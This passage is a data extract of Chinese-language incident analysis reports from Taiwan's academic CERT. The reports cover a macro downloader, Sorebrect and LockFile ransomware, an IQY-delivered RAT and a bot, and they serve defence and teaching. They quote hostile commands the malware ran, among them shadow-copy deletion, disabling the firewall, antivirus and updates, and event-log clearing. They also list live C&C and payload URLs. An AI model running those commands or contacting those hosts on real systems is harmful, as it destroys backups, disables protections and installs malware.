        "content": "導致系統效能降低。 7. 從連線時間的密集度來看,regsvr32.exe 的HTTP POST 連線session 間 隔不到一秒鐘,並且連線大小大概都在5KB 左右,算是異常網路流量。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 先檢測 port 80 的連線封包內容,幾乎都是用 HTTP POST 方式將密文資 料傳送出去,嘗試透過url 和 base64 decoder 對內容解碼,並無法成功 還原明文內容。此其中一個連線IP 168.62.8.129 內容。 9. 檢測port 443 其中一個連線封包,regsvr32.exe 連到IP 217.18.74.60 並 且傳輸內文都是加密密文,也無法解密了解其內容,只確定是惡意程式的 連線狀態。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 從以上連線紀錄來看,連到的port 80 和 443 的 IP 大多是一般網站或 有啟用WEB 服務主機,研判可能是遭駭客利用的跳板中繼站,用來接收底 層殭屍主機回報和下達指令用途。 11. 檢查開機自動啟動狀態,發現有一個批次檔 「7e1995c.bat」 被寫入啟 動程序中,其執行內容為呼叫隱藏資料夾中的惡意程式 「9d7b508.23138def」,其中黃色部分為指令視窗標題文字。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 惡意程式 「9d7b508.23138def」透過Virustotal 掃描結果為 0/56,表 示該檔案為較為新型的惡意程式或客製化的病毒,通常為APT 攻擊所用。 而該程式啟動後會執行 regsvr32.exe 產生對外惡意的連線。 13. 由於該事件主機沒有接受大量外部IP 的連入跡象,研判是一般底層殭屍 主機而非上層中繼站或C&C,但可能會接收中繼站或C&C 指令對外發動攻 擊。 III. ",
        "Page_Num": "3,4,5,6"
    },
    "287": {
        "File_Name": "個案分析-偽裝成文件格式的惡意執行檔事件分析報告_10603.pdf",
        "content": "網路架構圖 殭屍主機 駭客 被攻擊主機群 STEP 3 收到指令對外部主機 發動DDoS攻擊 STEP 2 定期向上層中繼站 WEB服務進行回報 STEP 1 感染偽裝TXT的惡意程式 中繼站跳板 176.110.148.221 168.62.8.129 195.90.108.192 150.12.79.28 ... 1. 使用者可能從垃圾郵件或釣魚郵件開啟偽裝成TXT 文件檔的惡意程式。 2. 惡意程式會持續向上層中繼站port 80 或443 以加密內容進行回報。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 殭屍主機透過定期回報等待C&C 和中繼站下達攻擊指令。 4. 殭屍主機收到指令後可能會對外部主機進行DDoS 攻擊。 IV. 建議與總結 1. 惡意程式入侵方式可能透過垃圾郵件或釣魚郵件對使用者發動APT 攻 擊,並且附加檔案多為偽造文件的執行檔。 2. 惡意程式執行後會自我刪除,並且感染系統內部檔案並執行系統程式 regsvr32.exe 對外產生網路連線。 3. Regsvr32.exe 會與上層跳板中繼站群port 80 和 443 進行報到動作,並 且等待C&C 的指令可能對外進行DDoS 攻擊。 4. 上層中繼站可能都是被駭客入侵有啟用Web 服務的跳板主機,用來接收來 自底層殭屍網路的回報。 5. 惡意程式並會寫入開機啟動執行任務,而執行的惡意程式 「9d7b508.23138def」在Virustotal 上尚無法被偵測出來。 6. 近期許多後門惡意程式經過駭客客製化,規避常用的偵測防毒或檢測,並 透過合法程式進行對外連線,故要注意不隨意開啟不明檔案。 7. 因為無法明確移除被感染的檔案,建議使用者將重要資料備份並且重新安 裝系統,確保能將惡意程式完全移除。 ",
        "Page_Num": "6,7"
    },
    "288": {
        "File_Name": "個案分析-內含巨集惡意程式的Word文件_10510.pdf",
        "content": "個案分析- 內含巨集惡意程式的Word 文件事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2016/10  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 常見的惡意程式大多習慣以EXE 或其他類型的執行檔傳播,少部分會 有PDF 或DOC 等文件檔案類型執行。 2. 本單位取得以副檔名 doc 的文件惡意程式樣本進行測試。 3. 通常這類型的惡意程式會以郵件夾檔方式傳播,並以關聯性高的檔案 名稱誘使收件者打開。 4. 該案例檔案名稱以“訂單名稱”為名稱的word 檔案,以巨集指令執行 惡意程式。 II. 事件檢測 1. 使用VM 虛擬主機並且為Windows 7(x64)系統進行隔離環境測試。 2. 取得測試的樣本病毒名稱為“order_details_02873828.doc”,為 office 的word 檔案。 3. 我們先透過 Virustotal 檢測該檔案的偵測比例,為30/54 的惡意程式。 4. 實際以office 2013 開啟該檔案後,整個word 檔案內容出現一張藍底白  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 字圖片,告知使用者必須開啟上方的啟用內容功能。 5. 從啟用功能項可以得知,該文件內含有巨集的指令程式,一旦啟用後就會 遭受惡意程式感染。 6. 嘗試啟用巨集內容後,winword.exe 開始呼叫背景程式 or219.exe,其路 徑位於 ~\\appdata\\local\\temp 底下。 7. 而 or219.exe 會去執行explorer.exe,透過他去呼叫 cmd.exe 執行其 他指令。 1. net.exe 和 net1.exe 將windows 的防火牆MpsSvc 停止關閉,而 sc.exe 去關閉防火牆 MpsSvc 的自動啟用功能。 2. net.exe 和net1.exe 將Windows 內建的 WinDefender 防毒關閉,而  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emer",
        "Page_Num": "1,2,3,4"
    },
    "289": {
        "File_Name": "個案分析-內含巨集惡意程式的Word文件_10510.pdf",
        "content": "gency Response Team sc.exe 將WinDefend 防護自動啟用關閉。 8. 此外or219.exe 還會執行cmd.exe 將wscsvc「資訊安全中心」的服務關 閉,sc.exe 將wscsvc 服務自動啟用關閉。 9. 此外or219.exe 還會執行cmd.exe 將wuauserv「自動更新」的服務關閉。 10. 此外or219.exe 還會刪除系統還原和磁碟機現存的快照備份,透過 vssadmin.exe delete shadows 的指令。 11. 從網路行為來看,當開啟惡意word 檔案的巨集指令時,system 的 svchost 會有對外的網路連線,主要分別為 178.208.78.195、 149.56.120.212 和89.44.47.181。 12. 觀察俄羅斯178.208.78.195 C&C 的連線封包內容,system 會向該網域 vetomoof.ru/h/gate.php 以HTTP POST 傳送一串加密文字,嘗試用 urldecoder 解密依然無法成功解析,推測可能是將主機機敏資訊回傳。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 13. 此外還會向網域sorolgoteveng.com 傳送binary 加密內容,而該網域 名稱解析也是相同IP 178.208.78.195。 14. 此外惡意程式會向斯里蘭卡中繼站149.56.120.212 下載惡意dll 檔案 pm.dll,該dll 檔案可能會對外建立連線。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 15. 透過Virustotal 檢測 pm.dll 結果為 48/57 比例的惡意程式,被歸類 為木馬病毒的後門程式。 16. 推測由pm.dll 向羅馬尼亞中繼站89.44.47.181 嘗試下載惡意程式 inst.exe,然而封包紀錄中得知該連線存取是失敗的,因為出現 404 Not Found 的回應。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 17. 最後觀察惡意程式都會",
        "Page_Num": "4,5,6,7"
    },
    "290": {
        "File_Name": "個案分析-內含巨集惡意程式的Word文件_10510.pdf",
        "content": "關閉,並沒有常駐於背景,推測是因為最後一步 的 inst.exe 沒有下載安裝成功,因此該word 檔應該只是木馬病毒的 Downloader,如同Virustotal 的檢測資訊。 III. 系統流程圖 開啟word檔案 執行巨集指令 惡意程式 or219.exe CMD.exe net.exe、net1.exe Stop MpsSvc net.exe、net1.exe Stop WinDefend net.exe、net1.exe Stop wscsvc net.exe、net1.exe Stop wuauserv Sc.exe MpsSvc start=disabled Sc.exe WinDefend start=disabled Sc.exe wscsvc start=disabled Sc.exe wuauserv start=disabled Vssadmin.exe Delete shadows 結束程序 or219.exe 停止 自動更新 停止 資訊安全中心 停止 系統防毒 停止 系統防火牆 刪除 系統快照備份 關閉啟用 自動更新 關閉啟用 資訊安全中心 關閉啟用 系統防毒 關閉啟用 系統防火牆  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team IV. 網路架構圖 開啟惡意word檔案 斯里蘭卡 中繼站 149.56.120.212 駭客 STEP 2 下載pm.dll 惡意程式 羅馬尼亞 中繼站 89.44.47.181 STEP 3 透過pm.dll 下載inst.exe 俄羅斯 C&C 178.208.78.195 STEP 1 回傳加密資料 HTTP POST STEP 4 控制殭屍主機 STEP 5 攻擊外部主機 1. 使用者無意間開啟含有惡意巨集指令的word 檔案,機敏資訊被回傳至俄 羅斯C&C。 2. 開始向斯里蘭卡的中繼站下載惡意程式pm.dll。 3. Pm.dll 為惡意程式Downloader 開始向羅馬尼亞中繼站下載木馬病毒 inst.exe。 4. 一旦下載安裝成功後,駭客可能就能夠遠端操控。 5. 感染主機可能接收指令對外部進行攻擊。 V. 建議與總結 1. 此惡意程式為藏匿於word ",
        "Page_Num": "7,8"
    },
    "291": {
        "File_Name": "個案分析-內含巨集惡意程式的Word文件_10510.pdf",
        "content": "檔案中的巨集指令病毒。 2. 此類病毒通常以垃圾郵件或社交工程郵件中夾帶之文件檔。 3. 當主機執行巨集指令後機敏資料可能就已經外洩。 4. 該檔案只是惡意程式的下載器,會再向其他中繼站下載木馬病毒執行。 5. 該惡意程式會關閉停用系統內的防護,包含防火牆或防毒軟體等服務,以 及刪除系統的備份映像,以成功後續動作。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 6. Downloader 病毒不一定會成功下載其他惡意程式,因為中繼站存活時間 都不長。 7. 一般來說防毒軟體都能夠成功偵測阻擋該類檔案,除非是APT 客製化過的 可能就會遺漏掉。 ",
        "Page_Num": "8,9"
    },
    "292": {
        "File_Name": "個案分析-具自我摧毀功能的無檔案式勒索病毒Sorebrect事件分析報告_10608.pdf",
        "content": "個案分析- 具自我摧毀功能的 無檔案式勒索病毒 Sorebrect(aes_ni_0day) 事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 106 年8 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 近幾年加密勒索病毒盛行,陸續出現的病毒種類與版本琳瑯滿目,台灣深受 其害的電腦不計其數,影響範圍從小至個人電腦,大至各行各業的伺服器。 2. 除了一般使用者與企業會遭受勒索病毒攻擊外,政府單位或學術單位也成為 勒索病毒的攻擊對象。 3. 此類勒索病毒的共同點都是加密電腦內檔案與要求使用者以比特幣支付贖 金,因為比特幣具匿名且可規避金流追查的特性,深深受犯罪組織的喜愛。 4. 本單位近期取得「具自我摧毀功能的無檔案式勒索病毒」樣本進行研究分析, 此版本病毒有別於以往的勒索病毒,感染後病毒本身即自我毀滅,增加樣本 取得的困難性。 II. 事件檢測 1. 使用2 台安裝Windows 7 系統的VM 虛擬主機進行隔離環境測試,兩台主機分 別為「已感染的ABC 主機」(IP:140.X.X.43)與「待感染的DEF 主機」 (IP:140.X.X.44),惡意程式樣本名稱為virus.exe 的執行檔,將程式 virus.exe 放於ABC 主機上執行。 2. 為了觀察惡意程式在網路上的擴散情形,故在DEF 主機上設置一些網路共用 的資料夾,並且在ABC 主機上設置一個連到DEF 主機之共享資料夾的網路磁 碟機(代號為Z)。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 程式virus.exe 執行後,該程式原始檔便會自我移除,讓使用者無法再次取 得程式的樣本,如同加密勒索軟體般有自我銷毀機制。之後開始針對主機內 部檔案進行加密。 4. 當主機內的檔案被加密後,在資料",
        "Page_Num": "1,2,3"
    },
    "293": {
        "File_Name": "個案分析-具自我摧毀功能的無檔案式勒索病毒Sorebrect事件分析報告_10608.pdf",
        "content": "夾中會出現!!! READ THIS - IMPORTANT !!!.txt 文字檔,通知受害者你的文件和其他檔案都已經被加密, 也發現網路磁碟機Z 中的檔案也被加密。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. 檢查所有資料夾發現被加密的檔案其檔案名稱都變為「原檔案名 稱.aes_ni_0day」,也發現.exe、.dll、.lnk 與.sys 等檔案類型的檔案沒有 被加密,而且若檔案大小太小也不會被加密。 6. 檢視整台ABC 主機發現在C:\\Windows 與ProgramFiles 這兩個資料夾中的所 有檔案都沒有被加密,可見此病毒並非加密所有資料夾中的檔案。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 檢視背景執行中的程式發現,程式virus.exe 執行後,會呼叫程式 svchost.exe,之後svchost.exe 執行時會呼叫程式vssadmin.exe 與 timeout.exe,而timeout.exe 執行後會執行程式bcdeit.exe 與 wevtutil.exe。從這些程式執行的蹤跡發現svchost.exe 一直持續執行著, 而程式vssadmin.exe 執行後會刪除系統內的影子副本,timeout.exe 執行後 會暫停命令處理器10 秒鐘,wevtutil.exe 執行時會先列出所有事件紀錄, 之後再將它們陸續清除。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 8. 檢視程式svchost.exe 的屬性,發現程式執行時會對同一網域的電腦進行TCP 139 port 的攻擊連線,該port 主要應用於文件共享與列印方面,可見該病 毒會掃描網域中的共用資料夾或周邊列印裝置。 9. 從截錄的封包內容檢視,觀察到惡意程式virus.exe 執行後,會對內部網路 進行139 port (netbios-ssn)與445 port 的掃描,並嘗試針對能夠存取的 共享資料夾進行加密,若有連接網路磁碟機或NAS 就有可能所儲存",
        "Page_Num": "3,4,5,6"
    },
    "294": {
        "File_Name": "個案分析-具自我摧毀功能的無檔案式勒索病毒Sorebrect事件分析報告_10608.pdf",
        "content": "的檔案遭 受到破壞。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 10. 從!!!READ THIS - IMPORTANT !!!.txt 文字檔中得知該病毒名稱為aes-ni ransomware,在文字檔開頭提到它是特別版的NSA EXPLOIT 版,與舊版的 aes-ni 不同,主機內的檔案是使用RSA-2048 公開金鑰加密AES-256 亂數產 生的金鑰所加密,並且警告任何嘗試用第三方的解密工具都可能毀損已被加 密的檔案,必須透過購買他們的RSA 私密金鑰才能解救這些檔案。除了提供 3 個聯絡用的電子信箱(0xc030@protomail.ch、0xc030@tuta.io 與  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team aes-ni@scryptmail.com)給受害者外,也告訴受害者可以透過BitMsg 或至 bleedingcomputer 網站上開主題論壇方式聯絡,最後也告訴受害者必須寄所 有在C:\\ProgramData 內檔名中有「.key.aes_ni_0day」名稱的金鑰給他們。 11. 將!!!READ THIS - IMPORTANT !!!.txt 文字檔與被加密的檔案上傳至勒索 病毒辨別網站(https://id-ransomware.malwarehunterteam.com), 檢測結 果為 AES-NI 勒索病毒。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 12. 對側錄封包內容進行分析,發現會連到一個美國IP: 216.239.36.21 去取得 憑證,並且傳送ABC 主機的IP 位置,該IP 的網站名稱為ipinfo.io,也發 現另有3 台主機與其同相同名稱,而且每次當virus.exe 執行時,所連到的 IP 必定是這四台主機中的其中一個,可見這四個主機為駭客收集受害主機的 IP 資料用。 13. 透過Virustotal 進行線上掃毒,該病毒檢測為惡意的比例高達57/63,其 中有6 家防",
        "Page_Num": "6,7,8,9"
    },
    "295": {
        "File_Name": "個案分析-具自我摧毀功能的無檔案式勒索病毒Sorebrect事件分析報告_10608.pdf",
        "content": "毒軟體無法檢測出此病毒,又由於此病毒與舊型的AES-NI 病毒不 同,故有少數有名的防毒公司稱此病毒為Sorebrect 勒索病毒,像賽門鐵克  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 與趨勢科技這兩家公司。 14. 檢視DEF 主機內資料夾被感染的情形,發現除了共用資料夾與使用者DEF 下的資料夾中檔案被加密外,其他檔案皆沒有被加密,而且在ProgramData 資料夾內也沒有看到RSA 金鑰,比對!!!READ THIS-IMPORTANT!!!.txt 文字  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 檔發現內容與ID 都一致,可見此病毒透過區域網路散布到區域網路內的電腦 時,並不會加密被感染電腦內的所有檔案,而且也沒有產生金鑰。 15. 下載AVAST 防毒公司所提供的AES_NI 病毒解密程式,測試是否可以將檔案 解密,詳細的解密步驟如下面表格所示。 No 說明 圖示 1 執行解密程式 avast_decryptor_aes_ni ,程式視窗開啟後點選「下 一步」。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2 選擇所要解密檔案的所在 位置,可增加磁碟機或資 料夾,確定內容後點選「下 一步」。 3 勾選「備分加密的檔案」 與「以系統管理者權限執 行解密過程」的選項,併 點選「Decrypt」,開始進 行檔案的解密。 4 解密完成後出現Z 磁碟 機:系統找不到指定路徑 的訊息,除了網路磁碟機 Z 內的檔案以外,所有檔 案皆已執行解密。 16. 執行完解密程式後,檢視系統內的檔案,發現被加密的檔案都已恢復原狀, 而且在資料夾中的!!!READ THIS - IMPORTANT !!!.txt 文字檔皆已被刪除, 但是網路磁碟機Z 中的檔案仍然沒有被解密。  12 臺灣學術網路危機處理中心(TACERT) TANet Computer Emer",
        "Page_Num": "9,10,11,12,13"
    },
    "296": {
        "File_Name": "個案分析-具自我摧毀功能的無檔案式勒索病毒Sorebrect事件分析報告_10608.pdf",
        "content": "gency Response Team 17. 將AVAST 解密程式放入網路磁碟機Z 中,並且至DEF 主機上執行此解密程 式,結果出現找不到金鑰的問題,將RSA 金鑰從ABC 主機之ProgramData 資 料夾中複製放入DEF 主機之ProgramData 的資料夾內,再次執行解密程式, 結果成功解密,可見此解密程式一定要有病毒來源頭ABC 主機的RSA 金鑰才  13 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 可以將檔案解密。  14 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 1. 駭客從遠端安裝PsExec.exe,並植入惡意程式於受害主機內。 2. 惡意程式執行後,呼叫程式svchost.exe 對受害主機內檔案進行加密, 並且惡意程式進行自我刪除。 3. 掃描區域網路內電腦之共用的資料夾或周邊裝置。 4. 傳送受害主機的IP 資訊至ipinfo.io 網站。 5. svchost.exe 執行後呼叫程式vssadmin.exe(刪除系統還原點的影子副 本)與timeout.exe(暫停命令處理器10 秒鐘)。 6. timeout.exe 執行後呼叫程式bcdedit.exe 與wevtutil.exe(清除所有事 件紀錄)。 7. 加密完成後,在每個病毒拜訪過的資料夾中產生一個!!!READ THIS - IMPORTANT !!!.txt 的勒索通知文字檔。  15 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team IV. 建議與總結 為有效預防感染無檔案式勒索病毒Sorebrect(aes_ni_0day)病毒,建議系統 管理者與使用者進行下列的防禦措施: 1. 限制使用者寫入的權限:重新檢視網域中每位使用者存取網路共用資料 夾的存取權限,僅提供使用者必要的存取權限,別讓任何人都能隨意存 取,降低遭到勒索病毒的攻擊機會。 2. 管制PsExec 的使用:透過PsExec 程式可以讓",
        "Page_Num": "13,14,15,16"
    },
    "297": {
        "File_Name": "個案分析-具自我摧毀功能的無檔案式勒索病毒Sorebrect事件分析報告_10608.pdf",
        "content": "管理者彈性地管理遠端主 機,相對地若駭客利用它,搭配之前已預先取得的系統管理員帳號與密 碼,將可在內部區域網路內安裝與執行惡意程式,因此,限制與管制一 些服務與工具的使用(如PsExec)將可以防範這些惡意程式的威脅。 3. 保持系統與網路的更新:為了避免惡意程式利用系統或網路漏洞侵入主 機,建議時常執行作業系統與應用程式的更新作業。 4. 定期備份資料:通常駭客利用受害者需要重要檔案與個人資料的心理來 逼迫受害者支付贖金,建議使用者平時做好資料備份作業。 5. 定期重設管理員與使用者的帳號密碼,並增加密碼強度。 ",
        "Page_Num": "16"
    },
    "298": {
        "File_Name": "個案分析-利用Excel IQY檔案散播後門程式事件分析報告_10707.pdf",
        "content": "個案分析- 利用Excel IQY 檔案散播 後門程式事件分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 107 年7 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team I. 事件簡介 1. 2018 年5 月中旬在網路上出現以主旨為Unpaid invoice[ID:隨機亂數]的信 件被散播著,該類型的信件皆夾帶一個副檔名為IQY 的附件,因為附檔本身 不含惡意行為,故可輕鬆躲避防毒軟體的檢查。 2. IQY 為純文字格式,是Microsoft Excel 所使用的Web 查詢設定檔,以Excel 開啟該類型檔案後會連向指定的網址取得資料,最後下載Flawed Ammy RAT 後門程式。 3. 為了瞭解該類型資安事件的觸發原因與攻擊行為,本中心取得IQY 樣本後進 行檢測。 II. 事件檢測 1. 首先,檢視IQY 樣本0621250.iqy 的內容,可以得知該檔案類型是Microsoft Excel Web 查詢檔案,而VirusTotal 檢測檔案0621250.iqy 的結果為28/59, 僅28 家防毒軟體公司的防毒軟體可以檢測出來,有些防毒軟體公司稱它為 IQYDownloader。  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 開啟檔案0621250.iqy 後,出現Microsoft Excel 安全性注意事項的提醒視 窗,點選「啟用」後即進入Excel 工作表畫面。 3. 檢視背景程式,發現Excel 執行檔在執行時,啟動dde 功能,因此當雙擊多 個excel 文檔時只會打開一個excel 進程。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 4. 檢視所開啟的Excel 檔內儲存格內容,發現僅有一欄有值,該值為621250, 與檔案名稱相同,在「編輯查詢」內發現「編輯Web 查詢」的地址為 「http://clodflarechk.com/2.dat」, 可見該檔案開啟後會連至該網址下載 2.dat ",
        "Page_Num": "1,2,3,4"
    },
    "299": {
        "File_Name": "個案分析-利用Excel IQY檔案散播後門程式事件分析報告_10707.pdf",
        "content": "檔回來。 5. 以記事本開啟檔案0621250.iqy,發現內容中有一個網址 http://clodflarechk.com/2.dat,與Web 查詢的地址相同。 6. 檢視2.dat 內容,發現該檔案會透過Powershell.exe 執行某一段下載指令, 將1.dat 下載到受害主機內。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 7. 查看1.dat 內容,發現透過PowerShell.exe 直接執行指令檔1.dat 後,會下 載檔案data.xls,並且執行它。 8. 查看data.xls 內容,發現該檔案開啟時出現該檔案格式與副檔名不相符的訊 息,而且開啟檔案後出現一堆亂碼,其中出現「This program cannot be run in DOS mode」的文字,推測該檔案的副檔名可能為.exe 的執行檔。  5 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 9. 將檔案data.xls 之檔名改為data.exe 後並執行它,發現它執行完成後即消 失不見,推測該檔案在執行後會自我刪除自己本身。 10. 將data.exe 執行後,從Process tree 可以看到它會呼叫多個cmd.exe,透 過cmd.exe 去呼叫net.exe 與sc.exe,其中指令cmd.exe /C net.exe stop ammyy、cmd.exe /C sc delete ammyy、cmd /C net.exe stop foundation 與 cmd.exe /C sc delete foundation 是用來偵測是否已安裝惡意程式,如 果惡意程式已存在,則終止已經存在而且執行中的惡意程式,避免重複執行, 最後它會自我刪除data.exe。 11. 檢視data.exe 程式碼,得知data.exe 執行後會連線網址 http://clodflarechk.com/cloud.png 並下載cloud.png,嘗試開啟644 KB 大小的cloud.png,但無法開啟。  6 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 經Virustotal 檢測,該檔案惡",
        "Page_Num": "4,5,6,7"
    },
    "300": {
        "File_Name": "個案分析-利用Excel IQY檔案散播後門程式事件分析報告_10707.pdf",
        "content": "意比例為0/59,而檔案資訊中File type 為 不知,可見該檔案為其他的檔案類型,因此Virustotal 無法檢測出其是否為 惡意。 12. 檔案2.dat、1.dat 與data.xls 經VirusTotal 檢測的結果,分述如下: (1) 2.dat 檢測出為惡意程式的比例為28/59,多家防毒軟體公司稱它為 IQYDownloader 或者Downloader。  7 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (2) 1.dat 檢測出為惡意程式的比例為25/59,多家防毒軟體公司稱它為 IQYDownloader 或者 Downloader。  8 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team (3) Data.xls 檢測出為惡意程式的比例為47/65,少數防毒軟體公司稱它為 Downloader。  9 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team III. 網路架構圖 1. 駭客散播含有惡意IQY 檔案的信件。 2. 受害者開啟含有IQY 檔案的信件,並且開啟IQY 檔案。 3. 受害者啟用「Excel 安全性注意事項」視窗之內容。 4. 受害主機連線惡意網址並下載PowerShell 腳本2.dat。 5. 透過cmd.exe 執行2.dat 來下載PowerShell 腳本1.dat。 6. 透過PowerShell.exe 執行1.dat 來下載data.xls。 7. 執行偽裝為Excel 檔案的data.exe 執行檔。 8. 連線http://clodflarechk.com/cloud.png,並下載cloud.png。 IV. 建議與總結 1. 本事件的發生是駭客散播含有IQY 附件的信件,讓受害者開啟附件後,下 載惡意程式於受害主機上執行,導致受害主機被植入後門程式 Flawed Ammy RAT。  10 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 2. 因為IQY 檔案為純文字格式,而且預設的檔案開啟程式是 Excel,駭客利 用這個特性將惡意的網址寫入IQY ",
        "Page_Num": "7,8,9,10,11"
    },
    "301": {
        "File_Name": "個案分析-利用Excel IQY檔案散播後門程式事件分析報告_10707.pdf",
        "content": "檔,欺騙受害者開啟檔案後連外取得 惡意程式回來執行,也因為IQY 的純文字內容不含有惡意行為,因此也 能有效規避防毒軟體的檢查。 3. 駭客在本事件所使用的IQY 檔案,因為是Excel Web 查詢的設定檔,可連 到指定網址,因此駭客可以很輕易的變更惡意網址,產生新的IQY 檔案。 4. 本事件所用到的1.dat 與2.dat 兩個檔案,可以用記事本編輯後存檔,因 此駭客可以很容易隨時修改惡意程式的下載網址與修改執行內容。 5. 為了預防該類型的攻擊事件發生,建議下列幾點措施。 (1)關閉Excel 檔案的Web 查詢功能。 在Excel 選項的「信任中心」頁面,點選「信任中心設定」。 在信任中心的「檔案封鎖設定」頁面,將從「Microsoft office 查 詢檔案」的選項開始至「Dif 和Sylk 檔案」的選項都打勾。  11 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 設定完成後,當開啟檔案封鎖設定所封鎖的檔案類型時則會啟動封鎖,並 出現提醒視窗。 (2)不開啟不明來源之檔案。 (3)安裝防毒軟體,並定期進行系統掃毒作業。 ",
        "Page_Num": "11,12"
    },
    "302": {
        "File_Name": "個案分析-利用ProxyShell漏洞的勒索病毒LockFile分析報告.pdf",
        "content": "TLP:WHITE 利用ProxyShell 漏洞的 勒索病毒LockFile 分析報告 臺灣學術網路危機處理中心團隊(TACERT)製 2021 年09 月  1 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 一、 事件簡介 1. ProxyShell 是由臺灣安全研究員 Orange Tsai 所發現,它是三個不同安 全漏洞的集合(CVE-2021-34473、CVE-2021-34523 與CVE-2021- 31207),可用於控制 Microsoft Exchange 電子郵件伺服器。各種攻擊者 正在積極利用該漏洞來破壞 Microsoft Exchange 伺服器,以植入 Web Shell 和勒索軟體。 2. ProxyShell 是Orange Tsai 發現的三個攻擊鏈的一部分(ProxyLogon、 ProxyOracle 與ProxyShell),而目前利用ProxyShell 漏洞的勒索軟體有 Conti 與Lockfile。 3. 根據The Record by Recorded Future 報導近 2,000 台 Microsoft Exchange 電子郵件伺服器在2021/8/20~2021/8/21 兩天內遭到駭客攻 擊,並且在所有者沒有為ProxyShell 的漏洞安裝修補程式後被後門感 染。安全公司 Huntress Labs 檢測到這些攻擊是在2021/8 月初在線上 發布概念驗證漏洞利用代碼之後發生的,並於2021/8/9~2021/8/13 那週 開始掃描易受攻擊的系統。 4. 在 ProxyShell 概念驗證代碼發布兩天后,ISC SANS 於 8 月 8 日進 行了一次掃描,發現總共100,000 個系統中的 30,400 多台 Exchange 伺服器尚未修補漏洞,並且仍然容易受到攻擊。之後攻擊愈演愈烈, 甚至一個名為 LockFile 的新勒索軟體也開始使用 ProxyShell 漏洞作 為進入公司網路的一種方式。 5. 新的勒索軟體家族LockFile 於 2021 年 7 月出現。它是通過利用 Microsoft Exchange 伺服器中統稱為 ProxyShell 的一系列漏洞進行散 播的。這些漏洞的修補程式自 2021 年4 月和5 月就已經可用,但是許 多組織還沒有修補他們的伺服器。自2021 年7 月以來,新型",
        "Page_Num": "1,2"
    },
    "303": {
        "File_Name": "個案分析-利用ProxyShell漏洞的勒索病毒LockFile分析報告.pdf",
        "content": "勒索軟體 LockFile 一直威脅著全球企業的受害者。其成功的關鍵是一些新技巧  2 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team ( 例如:間歇性加密),這些技巧使反勒索軟體解決方案更難檢測到它。 6. 為了瞭解勒索軟體LockFile 的攻擊行為,本中心取得該類型勒索軟體 的樣本後進行檢測。 二、事件檢測 1. 首先在Win 10 系統上執行勒索軟體Lockfile 樣本autoupdate.exe (MD5: 52e1fed4c521294c5de95bba958909c1)後,產生LOCKFILE 開頭的hta 檔案,最後autoupdate.exe 會消失不見,推測有內建自我刪除功能。 2. autoupdate.exe 經Virustotal 檢測其惡意比例為53/67,有11 家防毒軟體 以LOCKFILE 命名它。  3 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 3. 分析autoupdate.exe 內容,得知它在2021/8/21 完成compiler,為很新的 病毒樣本。 4. Autoupdate.exe 執行後會呼叫cmd.exe 來執行WMIC.exe,對於檔名含 有特定用字的應用程序會中斷執行。之後會執行數個mshta.exe 的腳本 程序,最後會執行cmd.exe 來刪除自己本身。  4 臺灣學術網路危機處理中心(TACERT) TANet Computer Emergency Response Team 5. Autoupdate.exe 執行後,桌面會出現 LOCKFILE-README-DESKTOP-96JCKMH-1630998963.hta 的畫面 (LOCKFILE-README-[hostname]-[id].hta)。駭客告訴受害者可以透過 Utox 或Tor 的管道與他們聯絡,也感謝lockbit 提供易用的警告模板。 此HTA Ransom note 是一個HTML 的應用程序,與一般常見的TXT 格 式的Ransom note 不同。此Ransom note 與 LockBit 2.0 勒索軟體使用 的Ransom note 非常相似。 6. 在Ransom note 中LockFile 要求受害者聯繫特定的電子郵件",
        "Page_Num": "2,3,4,5"
    },
    "304": {
